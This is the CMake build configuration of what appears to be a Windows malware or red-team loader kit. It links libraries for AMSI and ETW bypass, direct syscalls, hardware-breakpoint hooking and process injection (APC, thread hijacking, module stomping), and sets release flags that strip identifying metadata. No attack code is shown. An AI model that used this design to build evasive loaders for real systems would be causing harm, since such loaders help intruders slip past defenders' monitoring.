cmake_minimum_required(VERSION 3.20)
project(mdk C)

set(CMAKE_C_STANDARD 11)

set(MDK_FLAGS
    -nostdlib
    -fno-builtin
    -fno-stack-protector
    -Wall
    -Wextra
    -Wno-unused-parameter
    -Wno-cast-function-type
)

# Strip identity leaks and enable dead-code removal in the release binary.
set(MDK_LOADER_COMPILE_FLAGS
    -O2
    -fno-ident
    -fno-asynchronous-unwind-tables
    -ffunction-sections
    -fdata-sections
    -Wall
    -Wno-unused-function
    -Wno-pointer-sign
    -Wno-cast-function-type
)
set(MDK_LOADER_LINK_FLAGS
    -static
    -s
    -Wl,--gc-sections
    -Wl,--build-id=none
)

option(MDK_DEBUG "Enable verbose debug logging via mdk/dbg.h macros" OFF)
if(MDK_DEBUG)
    add_compile_definitions(MDK_DEBUG)
    message(STATUS "MDK_DEBUG enabled: loaders will emit stage banners and status logs")
else()
    message(STATUS "MDK_DEBUG disabled: loaders silent (production build)")
endif()

# --- Core ---

add_library(mdk_memory  STATIC src/core/memory.c)
add_library(mdk_thread  STATIC src/core/thread.c)
add_library(mdk_process STATIC src/core/process.c)
add_library(mdk_pe      STATIC src/core/pe.c)
add_library(mdk_payload STATIC src/core/payload.c)


# --- Evasion ---

add_library(mdk_evasion  STATIC
    src/evasion/dfr.c
    src/evasion/iat.c
    src/evasion/encode.c)

add_library(mdk_syscalls STATIC src/evasion/syscalls.c)

add_library(mdk_spawn    STATIC src/evasion/spawn.c)

add_library(mdk_hwbp     STATIC src/evasion/hwbp.c)
# hwbp uses mdk_discovery for the ALL_THREADS thread-list fanout.
target_link_libraries(mdk_hwbp PUBLIC mdk_thread mdk_evasion mdk_syscalls mdk_discovery)

add_library(mdk_amsi     STATIC src/evasion/amsi.c)
target_link_libraries(mdk_amsi PUBLIC mdk_hwbp)

add_library(mdk_etw      STATIC src/evasion/etw.c)
target_link_libraries(mdk_etw PUBLIC mdk_hwbp)


# --- Execution ---

add_library(mdk_execution STATIC
    src/execution/classic.c
    src/execution/stomp.c
    src/execution/section.c
    src/execution/apc.c
    src/execution/hijack.c)
target_link_libraries(mdk_execution PUBLIC mdk_memory mdk_thread mdk_process mdk_pe mdk_evasion mdk_syscalls)


# --- Discovery ---

add_library(mdk_discovery STATIC
    src/discovery/enum_process.c
    src/discovery/enum_thread.c
    src/discovery/env.c)


# --- Staging ---

add_library(mdk_staging STATIC src/staging/staging.c)


# --- Shared include + flag application ---

foreach(t mdk_memory mdk_thread mdk_process mdk_pe mdk_payload
          mdk_evasion mdk_syscalls mdk_spawn
          mdk_hwbp mdk_amsi mdk_etw
          mdk_execution
          mdk_discovery
          mdk_staging)
    target_include_directories(${t} PUBLIC include)
    target_compile_options(${t} PRIVATE ${MDK_FLAGS})
endforeach()


add_subdirectory(loaders)
